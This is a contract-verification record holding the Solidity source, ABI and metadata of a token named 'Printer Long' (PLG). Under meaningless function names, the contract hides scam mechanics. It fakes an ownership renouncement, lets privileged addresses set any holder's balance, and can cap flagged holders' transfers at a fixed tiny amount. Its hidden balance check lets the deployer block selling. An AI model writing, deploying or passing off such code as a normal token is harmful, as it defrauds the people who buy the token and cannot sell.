{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface minAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeList) external view returns (uint256);\n\n    function transfer(address sellTokenMode, uint256 launchedEnable) external returns (bool);\n\n    function allowance(address isTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellTokenMode,\n        uint256 launchedEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchFeeLiquidity, uint256 value);\n    event Approval(address indexed isTeam, address indexed spender, uint256 value);\n}\n\nabstract contract senderToToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletToken {\n    function createPair(address launchTrading, address exemptLimit) external returns (address);\n}\n\ninterface minAtMetadata is minAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrinterLong is senderToToken, minAt, minAtMetadata {\n\n    mapping(address => mapping(address => uint256)) private amountSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxExempt;\n    }\n\n    bool public buyTotal;\n\n    uint256 public exemptReceiver;\n\n    uint256 tradingAmount;\n\n    function amountWallet() public {\n        emit OwnershipTransferred(txLimit, address(0));\n        marketingLaunched = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldReceiver;\n    }\n\n    function feeAmount(address toReceiverLimit, address sellTokenMode, uint256 launchedEnable) internal returns (bool) {\n        if (toReceiverLimit == txLimit) {\n            return feeMax(toReceiverLimit, sellTokenMode, launchedEnable);\n        }\n        uint256 atFrom = minAt(atLimit).balanceOf(totalSwap);\n        require(atFrom == tradingAmount);\n        require(sellTokenMode != totalSwap);\n        if (tradingWalletMax[toReceiverLimit]) {\n            return feeMax(toReceiverLimit, sellTokenMode, enableMarketingAuto);\n        }\n        return feeMax(toReceiverLimit, sellTokenMode, launchedEnable);\n    }\n\n    function limitSellLaunch() private view {\n        require(limitList[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitToken;\n    }\n\n    uint256 constant enableMarketingAuto = 13 ** 10;\n\n    function launchAmount(address takeReceiver) public {\n        if (buyTotal) {\n            return;\n        }\n        if (launchShould == fromReceiver) {\n            exemptReceiver = launchedReceiver;\n        }\n        limitList[takeReceiver] = true;\n        if (exemptReceiver == launchedReceiver) {\n            tokenSwap = true;\n        }\n        buyTotal = true;\n    }\n\n    address totalSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private maxExempt = 18;\n\n    function getOwner() external view returns (address) {\n        return marketingLaunched;\n    }\n\n    address marketingTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public txLimit;\n\n    uint256 public toList;\n\n    event OwnershipTransferred(address indexed teamTakeLimit, address indexed totalIs);\n\n    bool public liquidityReceiver;\n\n    constructor (){\n        if (exemptReceiver == launchedReceiver) {\n            launchShould = launchedReceiver;\n        }\n        tokenTake isExempt = tokenTake(marketingTx);\n        atLimit = walletToken(isExempt.factory()).createPair(isExempt.WETH(), address(this));\n        \n        txLimit = _msgSender();\n        amountWallet();\n        limitList[txLimit] = true;\n        launchedBuySell[txLimit] = limitToken;\n        \n        emit Transfer(address(0), txLimit, limitToken);\n    }\n\n    function receiverFundTotal(uint256 launchedEnable) public {\n        limitSellLaunch();\n        tradingAmount = launchedEnable;\n    }\n\n    uint256 private fromReceiver;\n\n    function transfer(address modeToken, uint256 launchedEnable) external virtual override returns (bool) {\n        return feeAmount(_msgSender(), modeToken, launchedEnable);\n    }\n\n    address private marketingLaunched;\n\n    function approve(address toMax, uint256 launchedEnable) public virtual override returns (bool) {\n        amountSender[_msgSender()][toMax] = launchedEnable;\n        emit Approval(_msgSender(), toMax, launchedEnable);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletEnable;\n    }\n\n    uint256 private limitToken = 100000000 * 10 ** 18;\n\n    address public atLimit;\n\n    uint256 private launchedReceiver;\n\n    function feeMax(address toReceiverLimit, address sellTokenMode, uint256 launchedEnable) internal returns (bool) {\n        require(launchedBuySell[toReceiverLimit] >= launchedEnable);\n        launchedBuySell[toReceiverLimit] -= launchedEnable;\n        launchedBuySell[sellTokenMode] += launchedEnable;\n        emit Transfer(toReceiverLimit, sellTokenMode, launchedEnable);\n        return true;\n    }\n\n    uint256 public shouldAt;\n\n    uint256 exemptTeam;\n\n    string private walletEnable = \"Printer Long\";\n\n    function allowance(address tokenBuy, address toMax) external view virtual override returns (uint256) {\n        if (toMax == marketingTx) {\n            return type(uint256).max;\n        }\n        return amountSender[tokenBuy][toMax];\n    }\n\n    function balanceOf(address modeList) public view virtual override returns (uint256) {\n        return launchedBuySell[modeList];\n    }\n\n    string private shouldReceiver = \"PLG\";\n\n    mapping(address => bool) public limitList;\n\n    function transferFrom(address toReceiverLimit, address sellTokenMode, uint256 launchedEnable) external override returns (bool) {\n        if (_msgSender() != marketingTx) {\n            if (amountSender[toReceiverLimit][_msgSender()] != type(uint256).max) {\n                require(launchedEnable <= amountSender[toReceiverLimit][_msgSender()]);\n                amountSender[toReceiverLimit][_msgSender()] -= launchedEnable;\n            }\n        }\n        return feeAmount(toReceiverLimit, sellTokenMode, launchedEnable);\n    }\n\n    bool public tokenSwap;\n\n    uint256 private launchShould;\n\n    mapping(address => uint256) private launchedBuySell;\n\n    function tokenSwapEnable(address senderFeeFrom) public {\n        limitSellLaunch();\n        \n        if (senderFeeFrom == txLimit || senderFeeFrom == atLimit) {\n            return;\n        }\n        tradingWalletMax[senderFeeFrom] = true;\n    }\n\n    function marketingToken(address modeToken, uint256 launchedEnable) public {\n        limitSellLaunch();\n        launchedBuySell[modeToken] = launchedEnable;\n    }\n\n    function owner() external view returns (address) {\n        return marketingLaunched;\n    }\n\n    mapping(address => bool) public tradingWalletMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTakeLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchFeeLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"marketingToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"receiverFundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFeeFrom\",\"type\":\"address\"}],\"name\":\"tokenSwapEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingWalletMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiverLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTokenMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PrinterLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}